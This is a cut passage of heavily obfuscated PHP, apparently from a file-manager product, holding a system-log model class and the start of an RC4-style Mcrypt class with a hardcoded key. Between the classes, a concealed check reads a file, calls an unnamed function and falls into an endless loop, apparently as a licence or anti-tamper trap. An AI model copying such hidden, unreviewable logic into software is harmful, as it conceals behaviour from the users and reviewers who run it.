$A«•”Ò¯„˜[$BÎ©‚Â“îÔ[363]] != $F ·‰Ø‰åŞ[$BÎ©‚Â“îÔ[363]]) { return !1; } return parent::update($F ·‰Ø‰åŞ[$BÎ©‚Â“îÔ[363]], $bç¼¦ÈÉ«£); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\x6d\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\x54\x69\x6d\145", "\x74\x69\155\x65", "\x69\156\x73\145\x72\164", "\x66\165\x6e\143\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $aˆßˆ™ùÍõ =& $_SERVER[õëù©û]; return array($aˆßˆ™ùÍõ[2337] => LNG($aˆßˆ™ùÍõ[2338]), $aˆßˆ™ùÍõ[2339] => LNG($aˆßˆ™ùÍõ[2340]), $aˆßˆ™ùÍõ[2008] => LNG($aˆßˆ™ùÍõ[2341]), $aˆßˆ™ùÍõ[2342] => LNG($aˆßˆ™ùÍõ[2343]), $aˆßˆ™ùÍõ[2344] => LNG($aˆßˆ™ùÍõ[2345]), $aˆßˆ™ùÍõ[2346] => LNG($aˆßˆ™ùÍõ[2347]), $aˆßˆ™ùÍõ[2348] => LNG($aˆßˆ™ùÍõ[2349]), $aˆßˆ™ùÍõ[2350] => LNG($aˆßˆ™ùÍõ[2351]), $aˆßˆ™ùÍõ[2039] => LNG($aˆßˆ™ùÍõ[2352]), $aˆßˆ™ùÍõ[2040] => LNG($aˆßˆ™ùÍõ[2353]), $aˆßˆ™ùÍõ[2354] => LNG($aˆßˆ™ùÍõ[2355]), $aˆßˆ™ùÍõ[2356] => LNG($aˆßˆ™ùÍõ[2357]), $aˆßˆ™ùÍõ[2358] => LNG($aˆßˆ™ùÍõ[2359]), $aˆßˆ™ùÍõ[2360] => LNG($aˆßˆ™ùÍõ[2361]), $aˆßˆ™ùÍõ[2037] => LNG($aˆßˆ™ùÍõ[2362]), $aˆßˆ™ùÍõ[2043] => LNG($aˆßˆ™ùÍõ[2363]), $aˆßˆ™ùÍõ[2364] => LNG($aˆßˆ™ùÍõ[2365]), $aˆßˆ™ùÍõ[2366] => LNG($aˆßˆ™ùÍõ[2367]), $aˆßˆ™ùÍõ[2368] => LNG($aˆßˆ™ùÍõ[2369]), $aˆßˆ™ùÍõ[2370] => LNG($aˆßˆ™ùÍõ[2371]), $aˆßˆ™ùÍõ[2046] => LNG($aˆßˆ™ùÍõ[2372]), $aˆßˆ™ùÍõ[2047] => LNG($aˆßˆ™ùÍõ[2373]), $aˆßˆ™ùÍõ[2374] => LNG($aˆßˆ™ùÍõ[2375]), $aˆßˆ™ùÍõ[2376] => LNG($aˆßˆ™ùÍõ[2377]), $aˆßˆ™ùÍõ[2378] => LNG($aˆßˆ™ùÍõ[2379]), $aˆßˆ™ùÍõ[2380] => LNG($aˆßˆ™ùÍõ[2381]), $aˆßˆ™ùÍõ[2382] => LNG($aˆßˆ™ùÍõ[2383]), $aˆßˆ™ùÍõ[2041] => LNG($aˆßˆ™ùÍõ[2384]), $aˆßˆ™ùÍõ[2385] => LNG($aˆßˆ™ùÍõ[2386]), $aˆßˆ™ùÍõ[2387] => LNG($aˆßˆ™ùÍõ[2388]), $aˆßˆ™ùÍõ[2389] => LNG($aˆßˆ™ùÍõ[2389]), $aˆßˆ™ùÍõ[2390] => LNG($aˆßˆ™ùÍõ[2012]), $aˆßˆ™ùÍõ[2391] => LNG($aˆßˆ™ùÍõ[2392]), $aˆßˆ™ùÍõ[2393] => LNG($aˆßˆ™ùÍõ[2394]), $aˆßˆ™ùÍõ[2395] => LNG($aˆßˆ™ùÍõ[2396]), $aˆßˆ™ùÍõ[2397] => LNG($aˆßˆ™ùÍõ[2398]), $aˆßˆ™ùÍõ[2399] => LNG($aˆßˆ™ùÍõ[2400]), $aˆßˆ™ùÍõ[2401] => LNG($aˆßˆ™ùÍõ[2401]), $aˆßˆ™ùÍõ[2402] => LNG($aˆßˆ™ùÍõ[2403]), $aˆßˆ™ùÍõ[2404] => LNG($aˆßˆ™ùÍõ[2405]), $aˆßˆ™ùÍõ[2406] => LNG($aˆßˆ™ùÍõ[2407]), $aˆßˆ™ùÍõ[2408] => LNG($aˆßˆ™ùÍõ[2409]), $aˆßˆ™ùÍõ[2410] => LNG($aˆßˆ™ùÍõ[2411]), $aˆßˆ™ùÍõ[2412] => LNG($aˆßˆ™ùÍõ[2413])); } private function typeFile() { $DöÔˆÁµÊ¬ =& $_SERVER[õëù©û]; $E›•Œ…·³Ÿ = array($DöÔˆÁµÊ¬[2043] => array($DöÔˆÁµÊ¬[2044]), $DöÔˆÁµÊ¬[2358] => array($DöÔˆÁµÊ¬[2414]), $DöÔˆÁµÊ¬[2360] => array($DöÔˆÁµÊ¬[2415]), $DöÔˆÁµÊ¬[2037] => array($DöÔˆÁµÊ¬[2038]), $DöÔˆÁµÊ¬[2366] => array(), $DöÔˆÁµÊ¬[2368] => array(), $DöÔˆÁµÊ¬[2370] => array(), $DöÔˆÁµÊ¬[2046] => array($DöÔˆÁµÊ¬[2048]), $DöÔˆÁµÊ¬[2047] => array($DöÔˆÁµÊ¬[2048]), $DöÔˆÁµÊ¬[2374] => array($DöÔˆÁµÊ¬[2416]), $DöÔˆÁµÊ¬[2376] => array($DöÔˆÁµÊ¬[2416]), $DöÔˆÁµÊ¬[2378] => array($DöÔˆÁµÊ¬[2417]), $DöÔˆÁµÊ¬[2364] => array($DöÔˆÁµÊ¬[2418]), $DöÔˆÁµÊ¬[2380] => array($DöÔˆÁµÊ¬[2419]), $DöÔˆÁµÊ¬[2382] => array($DöÔˆÁµÊ¬[2420]), $DöÔˆÁµÊ¬[2041] => array($DöÔˆÁµÊ¬[2042])); return $E›•Œ…·³Ÿ; } private function typeAll() { goto FÍ´«ÆÑÍè; FÍ´«ÆÑÍè: $d×İ¿¸İŒâ =& $_SERVER[õëù©û]; $F¸ã¹ßâ• = $this->typeList; $d†±“Ş²çñ = array_filter($this->typeFile()); goto D‰È–éÏÑğ; D‰È–éÏÑğ: foreach ($d†±“Ş²çñ as $AôÆ¦æĞŒ => $AäÇó„âÔ¯) { $F¸ã¹ßâ•[$AäÇó„âÔ¯[0]] = $F¸ã¹ßâ•[$AôÆ¦æĞŒ]; } $F¸ã¹ßâ•[$d×İ¿¸İŒâ[2048]] = LNG($d×İ¿¸İŒâ[2421]); $F¸ã¹ßâ•[$d×İ¿¸İŒâ[2416]] = LNG($d×İ¿¸İŒâ[2422]); goto CÀ£õ‡¾ï¡; CÀ£õ‡¾ï¡: return $F¸ã¹ßâ•; goto e¹æ¿Üƒ¤; e¹æ¿Üƒ¤: } public function addLog($AÑ»ëßÏºÑ, $bÜÂï’™ó© = array()) { goto aÀİ¸ª« ´; aÀİ¸ª« ´: $d‚Ìİ•–ˆ¥ =& $_SERVER[õëù©û]; if (!isset($this->typeList[$AÑ»ëßÏºÑ])) { return; } $aîºî•ÒŸ¹ = USER_ID ? USER_ID : (isset($bÜÂï’™ó©[$d‚Ìİ•–ˆ¥[1404]]) ? $bÜÂï’™ó©[$d‚Ìİ•–ˆ¥[1404]] : 0); goto B‡ìÑóé; cÜÛåèÊõª: parent::add($bÜÂï’™ó©); goto aóŠ¾áºì; B‡ìÑóé: $Cº”èµÛ‡£ = get_client_ip(); if (!$bÜÂï’™ó© || strlen(json_encode($bÜÂï’™ó©)) >= 1024) { $bÜÂï’™ó© = array($d‚Ìİ•–ˆ¥[2423] => $Cº”èµÛ‡£); } else { if (is_array($bÜÂï’™ó©)) { $bÜÂï’™ó©[$d‚Ìİ•–ˆ¥[2423]] = $Cº”èµÛ‡£; } else { $bÜÂï’™ó© = array($d‚Ìİ•–ˆ¥[1025] => $bÜÂï’™ó©, $d‚Ìİ•–ˆ¥[2423] => $Cº”èµÛ‡£); } } $bÜÂï’™ó© = array($d‚Ìİ•–ˆ¥[1394] => Session::sign(), $d‚Ìİ•–ˆ¥[1395] => $aîºî•ÒŸ¹, $d‚Ìİ•–ˆ¥[29] => $AÑ»ëßÏºÑ, $d‚Ìİ•–ˆ¥[1397] => json_encode($bÜÂï’™ó©)); goto cÜÛåèÊõª; aóŠ¾áºì: } public function remove($c±Ÿ†ƒÍŠƒ) { $this->where(array($_SERVER[õëù©û][381] => $c±Ÿ†ƒÍŠƒ))->delete(); } private function _makeOrder($FÁÎ›Ëµ…§ = '') { goto eìÓ¨—ô¬; eìÓ¨—ô¬: $c«¿³À–¢Â =& $_SERVER[õëù©û]; $açÑè£¸çÏ = $c«¿³À–¢Â[183]; $D‘Á‹Õ×ë¨ = array($c«¿³À–¢Â[397] => $c«¿³À–¢Â[398], $c«¿³À–¢Â[399] => $c«¿³À–¢Â[400]); goto f²ÌÅ„¨¸; f²ÌÅ„¨¸: $f”˜ÈèŞäĞ = Input::get($c«¿³À–¢Â[403], $c«¿³À–¢Â[7], $c«¿³À–¢Â[2206], array($c«¿³À–¢Â[2143], $c«¿³À–¢Â[399])); $f”˜ÈèŞäĞ = $D‘Á‹Õ×ë¨[$f”˜ÈèŞäĞ]; $FÁÎ›Ëµ…§ = $FÁÎ›Ëµ…§ . "{$açÑè£¸çÏ}\x20{$f”˜ÈèŞäĞ}"; goto E“Áê¿‰¸; E“Áê¿‰¸: return $this->order($FÁÎ›Ëµ…§); goto d‘„Ôº˜Ë÷; d‘„Ôº˜Ë÷: } public function get($Bà¼Òª¥Î = '') { goto dÑÊ±ÁÊ; dÑÊ±ÁÊ: $E¨˜ÛŒì“Í =& $_SERVER[õëù©û]; if (!$Bà¼Òª¥Î) { show_json(array()); } $ešÀŠ°óå = array(); goto C®‹¿ÁòŠÏ; C®‹¿ÁòŠÏ: if ($Bà¼Òª¥Î[$E¨˜ÛŒì“Í[1404]]) { $ešÀŠ°óå[$E¨˜ÛŒì“Í[1404]] = $Bà¼Òª¥Î[$E¨˜ÛŒì“Í[1404]]; } if (isset($Bà¼Òª¥Î[$E¨˜ÛŒì“Í[697]])) { $D”ÛºöÒÜ = $Bà¼Òª¥Î[$E¨˜ÛŒì“Í[697]]; $F„¶©¾‰…â = isset($Bà¼Òª¥Î[$E¨˜ÛŒì“Í[698]]) ? $Bà¼Òª¥Î[$E¨˜ÛŒì“Í[698]] : time(); $ešÀŠ°óå[$E¨˜ÛŒì“Í[183]] = array($E¨˜ÛŒì“Í[317], array($D”ÛºöÒÜ, $F„¶©¾‰…â)); } if ($Bà¼Òª¥Î[$E¨˜ÛŒì“Í[29]]) { $FÒš¼Šî™’ = explode($E¨˜ÛŒì“Í[47], $Bà¼Òª¥Î[$E¨˜ÛŒì“Í[29]]); $fª‡Û†å = $this->typeFile(); $EŠ¨í‹¥ä = array(); foreach ($FÒš¼Šî™’ as $d„†°æ…š) { $EŠ¨í‹¥ä[] = $d„†°æ…š; if (isset($fª‡Û†å[$d„†°æ…š])) { $EŠ¨í‹¥ä = array_merge($EŠ¨í‹¥ä, $fª‡Û†å[$d„†°æ…š]); } } $EŠ¨í‹¥ä = array_unique($EŠ¨í‹¥ä); if ($EŠ¨í‹¥ä) { $ešÀŠ°óå[$E¨˜ÛŒì“Í[29]] = array($E¨˜ÛŒì“Í[7], $EŠ¨í‹¥ä); } } goto Fª–Å¶º†í; Fª–Å¶º†í: if (!empty($Bà¼Òª¥Î[$E¨˜ÛŒì“Í[2423]])) { $ešÀŠ°óå[$E¨˜ÛŒì“Í[400]] = array($E¨˜ÛŒì“Í[746], "\x25{$Bà¼Òª¥Î[$E¨˜ÛŒì“Í[2423]]}\x25"); } $BÛÙãºÄÁÒ = $this->_makeOrder()->where($ešÀŠ°óå)->selectPage(); if (empty($BÛÙãºÄÁÒ[$E¨˜ÛŒì“Í[350]])) { show_json(array(), !0, $BÛÙãºÄÁÒ[$E¨˜ÛŒì“Í[347]]); } goto f½†³‚øœ; f½†³‚øœ: $BÛÙãºÄÁÒ[$E¨˜ÛŒì“Í[350]] = $this->logList($BÛÙãºÄÁÒ[$E¨˜ÛŒì“Í[350]]); return $BÛÙãºÄÁÒ; goto eĞâİ”‡–¶; eĞâİ”‡–¶: } private function ipAddress(&$eÛÙ–ßâ‘») { $e¨ŠÇî…ƒƒ =& $_SERVER[õëù©û]; if (!empty($eÛÙ–ßâ‘»[$e¨ŠÇî…ƒƒ[2423]])) { $fÑ¢Ó×Åè— = IpLocation::get($eÛÙ–ßâ‘»[$e¨ŠÇî…ƒƒ[2423]]); if ($fÑ¢Ó×Åè— == $e¨ŠÇî…ƒƒ[2424]) { $fÑ¢Ó×Åè— = $e¨ŠÇî…ƒƒ[2425]; } } else { $fÑ¢Ó×Åè— = LNG($e¨ŠÇî…ƒƒ[2426]); } $eÛÙ–ßâ‘»[$e¨ŠÇî…ƒƒ[2427]] = $fÑ¢Ó×Åè—; } private function descZipDownload($f©è³‡õ‚™, &$FÔ¢ï²‹«„) { $eØ½ğ›¬‚ =& $_SERVER[õëù©û]; if (!isset($f©è³‡õ‚™[$eØ½ğ›¬‚[2428]])) { return; } $BğÇÈõ†„Ô = json_decode($f©è³‡õ‚™[$eØ½ğ›¬‚[2428]], !0); foreach ($BğÇÈõ†„Ô as $Böñï¿é®Ñ) { if (!IO::init($Böñï¿é®Ñ[$eØ½ğ›¬‚[75]])) { continue; } if (!($fñ‰¶ø¡„µ = IO::infoFull($Böñï¿é®Ñ[$eØ½ğ›¬‚[75]]))) { continue; } $f©è³‡õ‚™[$eØ½ğ›¬‚[75]] = $Böñï¿é®Ñ[$eØ½ğ›¬‚[75]]; $FÔ¢ï²‹«„[] = $f©è³‡õ‚™[$eØ½ğ›¬‚[365]] = $fñ‰¶ø¡„µ[$eØ½ğ›¬‚[365]]; $FÔ¢ï²‹«„[] = $f©è³‡õ‚™[$eØ½ğ›¬‚[2239]] = $fñ‰¶ø¡„µ[$eØ½ğ›¬‚[456]]; break; } return $f©è³‡õ‚™; } private function getSourceList(&$eõ®¾ò‡Í ) { $fÈÊï¾ØïÛ =& $_SERVER[õëù©û]; $Aß²âîŠëÄ = array(); foreach ($eõ®¾ò‡Í  as $C«×¸×©ÆÜ => $A¤ßÎÔ¿¹µ) { goto cÕ²®µöÃ; cÕ²®µöÃ: $f¡ÎËÔãä¦ = json_decode($A¤ßÎÔ¿¹µ[$fÈÊï¾ØïÛ[400]], !0); if ($A¤ßÎÔ¿¹µ[$fÈÊï¾ØïÛ[29]] == $fÈÊï¾ØïÛ[2040]) { $f¡ÎËÔãä¦ = $this->descZipDownload($f¡ÎËÔãä¦, $Aß²âîŠëÄ); $eõ®¾ò‡Í [$C«×¸×©ÆÜ][$fÈÊï¾ØïÛ[400]] = json_encode($f¡ÎËÔãä¦); continue; } if (strpos($A¤ßÎÔ¿¹µ[$fÈÊï¾ØïÛ[29]], $fÈÊï¾ØïÛ[2240]) !== 0) { goto cï‡Ûº ; cï‡Ûº : if (!isset($f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[75]]) || strpos($A¤ßÎÔ¿¹µ[$fÈÊï¾ØïÛ[29]], $fÈÊï¾ØïÛ[2429]) !== 0) { continue; } if (!IO::init($f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[75]])) { continue; } if (!($bˆÂæ²Ñ = IO::infoFull($f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[75]]))) { continue; } goto CµÒÆÈ–“; CµÒÆÈ–“: $Aß²âîŠëÄ[] = $f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[365]] = $bˆÂæ²Ñ[$fÈÊï¾ØïÛ[365]]; $Aß²âîŠëÄ[] = $f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[2239]] = $bˆÂæ²Ñ[$fÈÊï¾ØïÛ[456]]; $eõ®¾ò‡Í [$C«×¸×©ÆÜ][$fÈÊï¾ØïÛ[400]] = json_encode($f¡ÎËÔãä¦); goto Côï”ĞÀàÆ; Côï”ĞÀàÆ: continue; goto f½æ–‰‹Œ; f½æ–‰‹Œ: } goto bµ•¡Í¡‘‹; bµ•¡Í¡‘‹: $Aß²âîŠëÄ[] = $f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[365]]; $Aß²âîŠëÄ[] = $f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[2239]]; if ($f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[29]] == $fÈÊï¾ØïÛ[487]) { $Aß²âîŠëÄ[] = $f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[400]][$fÈÊï¾ØïÛ[997]]; $Aß²âîŠëÄ[] = $f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[400]][$fÈÊï¾ØïÛ[998]]; } goto c÷Ê¦Ú“ËÂ; c÷Ê¦Ú“ËÂ: if ($f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[29]] == $fÈÊï¾ØïÛ[2247]) { $Aß²âîŠëÄ[] = $f¡ÎËÔãä¦[$fÈÊï¾ØïÛ[400]][$fÈÊï¾ØïÛ[365]]; } goto c£ÊÏÉ•²Ó; c£ÊÏÉ•²Ó: } if (!$Aß²âîŠëÄ) { return array(); } return Model($fÈÊï¾ØïÛ[747])->sourceListInfo($Aß²âîŠëÄ, !0); } private function logList($cñ—ÕÛÛÕã) { goto E¹Œ®İ¢ÊŠ; E¹Œ®İ¢ÊŠ: $bÀõäÀäÃ =& $_SERVER[õëù©û]; $dÍè°ŠØé‚ = array_to_keyvalue($cñ—ÕÛÛÕã, $bÀõäÀäÃ[33], $bÀõäÀäÃ[1404]); $B´•¼ÏË„Ü = Model($bÀõäÀäÃ[472])->userListInfo(array_unique($dÍè°ŠØé‚)); goto d“æ»©òÂ‹; f–¤˜¡ÙâÇ: $A×¸‘¿ÙÆæ = array(); foreach ($cñ—ÕÛÛÕã as $B‡î‰éŒ»Œ => $BèÀØÃê‘©) { goto f“”¥’¯™å; aÅ„’°ÇÊ©: $this->ipAddress($BèÀØÃê‘©); if (strpos($fè‘Äô¼ç, $bÀõäÀäÃ[2240]) === 0 || isset($D¸©Œ¾°Â[$bÀõäÀäÃ[2239]])) { goto a±™†¦³ó; EÒ˜È°Ü†æ: if ($D¸©Œ¾°Â[$bÀõäÀäÃ[2252]] && $D¸©Œ¾°Â[$bÀõäÀäÃ[2252]][$bÀõäÀäÃ[367]] == $bÀõäÀäÃ[1071]) { $A×¸‘¿ÙÆæ[] = $BèÀØÃê‘©[$bÀõäÀäÃ[363]]; unset($cñ—ÕÛÛÕã[$B‡î‰éŒ»Œ]); continue; } goto bŞ˜˜ë®Å´; E¼©¡°ÏÄ…: if ($D¸©Œ¾°Â[$bÀõäÀäÃ[29]] == $bÀõäÀäÃ[2247]) { $D¸©Œ¾°Â[$bÀõäÀäÃ[400]][$bÀõäÀäÃ[365]] = $cêˆ×èÊÛš[$D¸©Œ¾°Â[$bÀõäÀäÃ[400]][$bÀõäÀäÃ[365]]]; } if ($D¸©Œ¾°Â[$bÀõäÀäÃ[29]] == $bÀõäÀäÃ[2035]) { $D¸©Œ¾°Â[$bÀõäÀäÃ[2252]] = $D¸©Œ¾°Â[$bÀõäÀäÃ[387]]; $D¸©Œ¾°Â[$bÀõäÀäÃ[2239]] = $D¸©Œ¾°Â[$bÀõäÀäÃ[2252]][$bÀõäÀäÃ[365]]; $D¸©Œ¾°Â[$bÀõäÀäÃ[387]] = !1; $D¸©Œ¾°Â[$bÀõäÀäÃ[365]] = $bÀõäÀäÃ[33]; } if ($D¸©Œ¾°Â[$bÀõäÀäÃ[387]] && $D¸©Œ¾°Â[$bÀõäÀäÃ[387]][$bÀõäÀäÃ[367]] == $bÀõäÀäÃ[1071]) { $A×¸‘¿ÙÆæ[] = $BèÀØÃê‘©[$bÀõäÀäÃ[363]]; unset($cñ—ÕÛÛÕã[$B‡î‰éŒ»Œ]); continue; } goto EÒ˜È°Ü†æ; a±™†¦³ó: $D¸©Œ¾°Â[$bÀõäÀäÃ[387]] = $cêˆ×èÊÛš[$D¸©Œ¾°Â[$bÀõäÀäÃ[365]]]; $D¸©Œ¾°Â[$bÀõäÀäÃ[2252]] = $cêˆ×èÊÛš[$D¸©Œ¾°Â[$bÀõäÀäÃ[2239]]]; if ($D¸©Œ¾°Â[$bÀõäÀäÃ[29]] == $bÀõäÀäÃ[487]) { $D¸©Œ¾°Â[$bÀõäÀäÃ[400]][$bÀõäÀäÃ[997]] = $cêˆ×èÊÛš[$D¸©Œ¾°Â[$bÀõäÀäÃ[400]][$bÀõäÀäÃ[997]]]; $D¸©Œ¾°Â[$bÀõäÀäÃ[400]][$bÀõäÀäÃ[998]] = $cêˆ×èÊÛš[$D¸©Œ¾°Â[$bÀõäÀäÃ[400]][$bÀõäÀäÃ[998]]]; } goto E¼©¡°ÏÄ…; bŞ˜˜ë®Å´: } $BèÀØÃê‘©[$bÀõäÀäÃ[400]] = $D¸©Œ¾°Â; goto AË¢êéœÉõ; FöíÖ¤ÏÜÖ: $BèÀØÃê‘©[$bÀõäÀäÃ[2205]] = $AæÀ„ŸÑÙ‚; $D¸©Œ¾°Â = json_decode($BèÀØÃê‘©[$bÀõäÀäÃ[400]], !0); $BèÀØÃê‘©[$bÀõäÀäÃ[2423]] = isset($D¸©Œ¾°Â[$bÀõäÀäÃ[2423]]) ? $D¸©Œ¾°Â[$bÀõäÀäÃ[2423]] : $bÀõäÀäÃ[33]; goto aÅ„’°ÇÊ©; f“”¥’¯™å: $fè‘Äô¼ç = $BèÀØÃê‘©[$bÀõäÀäÃ[29]]; $AæÀ„ŸÑÙ‚ = isset($B´•¼ÏË„Ü[$BèÀØÃê‘©[$bÀõäÀäÃ[1404]]]) ? $B´•¼ÏË„Ü[$BèÀØÃê‘©[$bÀõäÀäÃ[1404]]] : !1; $AŒ†—ã†·Ü = strpos($fè‘Äô¼ç, $bÀõäÀäÃ[2430]) === 0 ? LNG($bÀõäÀäÃ[2431]) : LNG($bÀõäÀäÃ[2426]); goto AåÄâØé; AåÄâØé: $BèÀØÃê‘©[$bÀõäÀäÃ[28]] = isset($AæÀ„ŸÑÙ‚[$bÀõäÀäÃ[28]]) ? $AæÀ„ŸÑÙ‚[$bÀõäÀäÃ[28]] : LNG($bÀõäÀäÃ[2426]); $BèÀØÃê‘©[$bÀõäÀäÃ[2288]] = isset($AæÀ„ŸÑÙ‚[$bÀõäÀäÃ[2288]]) ? $AæÀ„ŸÑÙ‚[$bÀõäÀäÃ[2288]] : $bÀõäÀäÃ[33]; $BèÀØÃê‘©[$bÀõäÀäÃ[1310]] = isset($A†éÎÕ«¨ [$fè‘Äô¼ç]) ? $A†éÎÕ«¨ [$fè‘Äô¼ç] : $AŒ†—ã†·Ü; goto FöíÖ¤ÏÜÖ; AË¢êéœÉõ: unset($BèÀØÃê‘©[$bÀõäÀäÃ[2432]]); $EÂ˜ùÔÄÅŸ[] = $BèÀØÃê‘©; goto CÛƒ¶…Â‚Ğ; CÛƒ¶…Â‚Ğ: } $this->clearSystemPathLog($A×¸‘¿ÙÆæ); goto a’±††»‘; a’±††»‘: return $EÂ˜ùÔÄÅŸ; goto B´Âò°; d“æ»©òÂ‹: $cêˆ×èÊÛš = $this->getSourceList($cñ—ÕÛÛÕã); $A†éÎÕ«¨  = $this->typeAll(); $EÂ˜ùÔÄÅŸ = array(); goto f–¤˜¡ÙâÇ; B´Âò°: } private function clearSystemPathLog($cÙÕ¾Õã) { $B×…ËÚğ¡ =& $_SERVER[õëù©û]; if (count($cÙÕ¾Õã) == 0) { return; } $añ«äñ‰¦¼ = array($B×…ËÚğ¡[363] => array($B×…ËÚğ¡[7], array_unique($cÙÕ¾Õã))); $this->where($añ«äñ‰¦¼)->delete(); } public function deviceList($CƒŠ¦®Ïã, $eµÅ“Öâ£‡ = 0) { $fÉ“†¤Ê¥ =& $_SERVER[õëù©û]; $D¨Ã¼¸± = array($fÉ“†¤Ê¥[1404] => $CƒŠ¦®Ïã, $fÉ“†¤Ê¥[183] => array($fÉ“†¤Ê¥[921], $eµÅ“Öâ£‡), $fÉ“†¤Ê¥[29] => $fÉ“†¤Ê¥[2008]); $b¬ğË•œóˆ = array(); $c¿®áØ¶‹½ = $this->field($fÉ“†¤Ê¥[2433])->where($D¨Ã¼¸±)->order($fÉ“†¤Ê¥[2250])->limit(50)->select(); foreach ($c¿®áØ¶‹½ as $D½ãóìâä˜ => $Dã¤ğàåí¶) { goto CŒ‚íãƒ¹‘; CŒ‚íãƒ¹‘: if ($D½ãóìâä˜ > 0 && abs($Dã¤ğàåí¶[$fÉ“†¤Ê¥[183]] - $c¿®áØ¶‹½[$D½ãóìâä˜ - 1][$fÉ“†¤Ê¥[183]]) < 5) { continue; } $A Ò‚ÚöæÁ = json_decode($Dã¤ğàåí¶[$fÉ“†¤Ê¥[400]], !0); $Dã¤ğàåí¶[$fÉ“†¤Ê¥[2423]] = isset($A Ò‚ÚöæÁ[$fÉ“†¤Ê¥[2423]]) ? $A Ò‚ÚöæÁ[$fÉ“†¤Ê¥[2423]] : $fÉ“†¤Ê¥[33]; goto A’‰ª´…¿; D•’ ™îè: $this->ipAddress($Dã¤ğàåí¶); $Dã¤ğàåí¶[$fÉ“†¤Ê¥[400]] = $A Ò‚ÚöæÁ; $b¬ğË•œóˆ[$F³„¢õ¬–Õ] = $Dã¤ğàåí¶; goto Eë•äš‰Çƒ; A’‰ª´…¿: unset($A Ò‚ÚöæÁ[$fÉ“†¤Ê¥[2423]]); $F³„¢õ¬–Õ = $this->deviceType($A Ò‚ÚöæÁ[$fÉ“†¤Ê¥[2241]]); if (isset($b¬ğË•œóˆ[$F³„¢õ¬–Õ])) { continue; } goto D•’ ™îè; Eë•äš‰Çƒ: } return array_values($b¬ğË•œóˆ); } public function deviceType($b¯Ş“¿Š) { return $b¯Ş“¿Š; } } if (!isset($_SERVER[$_SERVER[õëù©û][781]]) || !isset($_SERVER[$_SERVER[õëù©û][782]])) { goto E˜´‚öñÜÃ; E¨‚«¼˜µ: $E£Ú³ÄèÌë = explode($_SERVER[õëù©û][213], $b£œîÏ¡Ğë); if (count($E£Ú³ÄèÌë) < $_SERVER[õëù©û][555]) { $DÓ×¬Ëªµö = $_SERVER[õëù©û][787]; $DÓ×¬Ëªµö(); } $DìÀÉ„®†ñ = $_SERVER[õëù©û][1475]; goto EÙ»™šŠ—; E˜´‚öñÜÃ: $AÛ‰íµä­ = $_SERVER[õëù©û][784]; $F‰Õ¿„§šÚ = $_SERVER[$_SERVER[õëù©û][785]] . $_SERVER[õëù©û][786]; $b£œîÏ¡Ğë = $AÛ‰íµä­($F‰Õ¿„§šÚ); goto E¨‚«¼˜µ; EÙ»™šŠ—: $DìÀÉ„®†ñ($_SERVER[$_SERVER[õëù©û][785]] . $_SERVER[õëù©û][786]); $cÅÛÈœå×Ã = 2; while ($cÅÛÈœå×Ã > 1) { $FÆêíÑá©Æ = rawurlencode($cÅÛÈœå×Ã . $_SERVER[õëù©û][357]); } goto cİÑ—Ø†òî; cİÑ—Ø†òî: } goto Fğ¤Ô¢´Ç×; F²¥¤‰èŒ•: class Mcrypt { public static $defaultKey = "\x61\41\164\x61\153\101\72\144\154\x6d\143\x6c\144\105\x76\x2c\x65"; public static function encode($FÇóâé¥ğ°, $a±õÉÌàæœ = '', $eçô®‡ì = 0, $Eîöõïğ±Ï = '') { goto f‹ÓÍïæİ; aÊ­ ó †©: for ($E¼‚œÏ = 0; $E¼‚œÏ <= 255; $E¼‚œÏ++) { $F‰Şßçù÷ï[$E¼‚œÏ] = ord($däŠìÔœƒ†[$E¼‚œÏ % $d“†ö…Ù°‹]); } $A…ÏÙ£î¡ß = range(0, 255); for ($AŞÄáŠÛ­¤ = $E¼‚œÏ = 0; $E¼‚œÏ < 256; $E¼‚œÏ++) { $AŞÄáŠÛ­¤ = ($AŞÄáŠÛ­¤ + $A…ÏÙ£î¡ß[$E¼‚œÏ] + $F‰Şßçù÷ï[$E¼‚œÏ]) % 256; $eÓšòø³Ë  = $A…ÏÙ£î¡ß[$E¼‚œÏ]; $A…ÏÙ£î¡ß[$E¼‚œÏ] = $A…ÏÙ£î¡ß[$AŞÄáŠÛ­¤]; $A…ÏÙ£î¡ß[$AŞÄáŠÛ­¤] = $eÓšòø³Ë ; } goto e––ïŒ›åˆ; e––ïŒ›åˆ: $A„•ÅŒğ»¸ = $c’Ÿæ™â’Á[33]; for ($F¼£«µ©Í› = $AŞÄáŠÛ­¤ = $E¼‚œÏ = 0; $E¼‚œÏ < $B£…­ÖìĞÃ; $E¼‚œÏ++) { $F¼£«µ©Í› = ($F¼£«µ©Í› + 1) % 256; $AŞÄáŠÛ­¤ = ($AŞÄáŠÛ­¤ + $A…ÏÙ£î¡ß[$F¼£«µ©Í›]) % 256; $eÓšòø³Ë  = $A…ÏÙ£î¡ß[$F¼£«µ©Í›]; $A…ÏÙ£î¡ß[$F¼£«µ©Í›] = $A…ÏÙ£î¡ß[$AŞÄáŠÛ­¤]; $A…ÏÙ£î¡ß[$AŞÄáŠÛ­¤] = $eÓšòø³Ë ; $A„•ÅŒğ»¸ .= chr(ord($FÇóâé¥ğ°[$E¼‚œÏ]) ^ $A…ÏÙ£î¡ß[($A…ÏÙ£î¡ß[$F¼£«µ©Í›] + $A…ÏÙ£î¡ß[$AŞÄáŠÛ­¤]) % 256]); } $A„•ÅŒğ»¸ = $A¶äù ‚éê . str_replace($c’Ÿæ™â’Á[900], $c’Ÿæ™â’Á[33], base64_encode($A„•ÅŒğ»¸)); goto fËÙĞ½ğ·Ë; fËÙĞ½ğ·Ë: $A„•ÅŒğ»¸ = str_replace(array($c’Ÿæ™â’Á[280], $c’Ÿæ™â’Á[8], $c’Ÿæ™â’Á[900]), array($c’Ÿæ™â’Á[407], $c’Ÿæ™â’Á[70], $c’Ÿæ™â’Á[91]), $A„•ÅŒğ»¸); return 